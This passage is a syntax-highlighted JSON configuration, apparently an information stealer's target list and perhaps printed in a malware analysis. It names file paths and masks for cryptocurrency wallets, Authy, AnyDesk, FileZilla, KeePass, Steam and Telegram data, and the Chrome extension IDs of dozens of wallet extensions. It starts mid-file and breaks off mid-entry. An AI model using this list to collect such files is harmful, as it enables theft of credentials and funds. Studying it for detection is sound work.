class="string">&quot;Wallets/Ethereum&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\Exodus\\exodus.wallet&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wallets/Exodus&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\Ledger Live&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wallets/Ledger Live&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\atomic\\Local Storage\\leveldb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wallets/Atomic&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%localappdata%\\Coinomi\\Coinomi\\wallets&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wallets/Coinomi&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\Authy Desktop\\Local Storage\\leveldb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wallets/Authy Desktop&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\Bitcoin\\wallets&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wallets/Bitcoin core&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\com.liberty.jaxx\\IndexedDB&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*.leveldb&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wallets/JAXX New Version&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\Electrum\\wallets&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wallets/Electrum&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\AnyDesk&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*.conf&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Applications/AnyDesk&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\FileZilla&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;recentservers.xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Applications/FileZilla&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\FileZilla&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sitemanager.xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Applications/FileZilla&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%userprofile%&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*.kbdx&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Applications/KeePass&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%programfiles%\\Steam&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ssfn*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Applications/Steam&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%programfiles%\\Steam\\config&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Applications/Steam/config&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%appdata%\\Telegram Desktop&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;m&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*s&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;z&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Applications/Telegram&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;t&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;e&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ejbalbakoplchlghecdalmeeeajnimhm&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MetaMask&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nkbihfbeogaeaoehlefnkodbefgpgknn&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MetaMask&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;egjidjbpglichdcondbcbdnbeeppgdph&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Trust Wallet&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ibnejdfjmmkpcnlpebklmnkoeoihofec&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TronLink&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fnjhmkhhmkbjkkabndcnnogagogbneec&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Ronin Wallet&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fhbohimaelbohpjbbldcngcnapndodjp&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Binance Chain Wallet&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ffnbelfdoeiohenkjibnmadjiehjhajb&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Yoroi&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jbdaocneiiinmjbjlgalhcelgbejmnid&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Nifty&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;afbcbjpbpfadlkmhmclhkeeodmamcflc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Math&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hnfanknocfeofbddgcijnmhnfnkdnaad&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Coinbase&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hpglfhgfnhbgpjdenjgmdgoeiappafln&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Guarda&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blnieiiffboillknjnepogjhkgnoapac&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;EQUA&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cjelfplplebdjjenllpjcblmjkfcffne&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Jaxx Liberty&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fihkakfobkmkjojpchpfgcmhfjnmnfpi&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;BitApp&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;kncchdigobghenbbaddojjnnaogfppfj&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iWlt&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;kkpllkodjeloidieedojogacfhpaihoh&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;EnKrypt&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;amkmjjmmflddogmhpjloimipbofnfjih&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wombat&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nlbmnnijcnlegkjjpcfjclmcfggfefdm&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MEW CX&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nanjmdknhkinifnkgdcggcfnhdaammmj&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Guild&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nkddgncdjgjfcddamfgcmfnlhccnimig&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Saturn&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cphhlgmgameodnhkjdmkpanlelnlohao&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NeoLine&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nhnkbkgjikgcigadomkphalanndcapjk&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Clover&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;kpfopkelmapcoipemfendmdcghnegimn&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Liquality&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aiifbnbfobpmeekipheeijimdpnlpgpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Terra Station&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dmkamcknogkgcdfhhbddcghachkejeap&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Keplr&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fhmfendgdocmcbmfikdcogofphimnkno&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Sollet&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cnmamaachppnkjgnildpdmkaakejnhae&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Auro&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jojhfeoedkpkglbfimdfabpdfjaoolaf&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Polymesh&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;flpiciilemghbmfalicajoolhkkenfe&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ICONex&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nknhiehlklippafakaeklbeglecifhad&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Nabox&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hcflpincpppdclinealmandijcmnkbgn&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;KHC&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ookjlbkiijinhpmnjffcofjonbfbgaoc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Temple&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mnfifefkajgofkcjkemidiaecocnkjeh&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;TezBox&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lodccjjbdhfakaekdiahmedfbieldgik&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;DAppPlay&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ijmpgkjfkbfhoebgogflfebnmejmfbm&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;BitClip&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lkcjlnjfpbikmcmbachjpdbijejflpcm&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Steem Keychain&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;onofpnbbkehpmmoabgpcpmigafmmnjh&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Nash Extension&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;en&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bcopgchhojmggmffilplmbdicgaihlkp&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;ez&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hycon Lite 